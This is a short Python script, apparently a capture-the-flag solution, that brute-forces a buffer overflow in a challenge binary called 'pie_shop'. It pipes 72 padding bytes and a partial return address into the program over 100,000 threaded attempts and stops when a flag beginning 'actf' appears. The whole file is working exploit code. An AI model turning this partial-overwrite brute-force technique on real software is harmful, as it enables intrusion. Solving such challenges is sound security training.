import subprocess
import multiprocessing.dummy as mp 

def do_work(s):
    cmd = "python -c \"print('\x01'*72 + '\xa9\xc1\x3a\xb4\x64\x55')\" | ./pie_shop;"

    task = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    result = task.stdout.read()

    if 'actf' in result:
        print(result)
        quit()
    print(result)

if __name__=="__main__":
    p=mp.Pool(1000)
    p.map(do_work,range(0,100000)) # range(0,1000) if you want to replicate your example
    p.close()
    p.join()
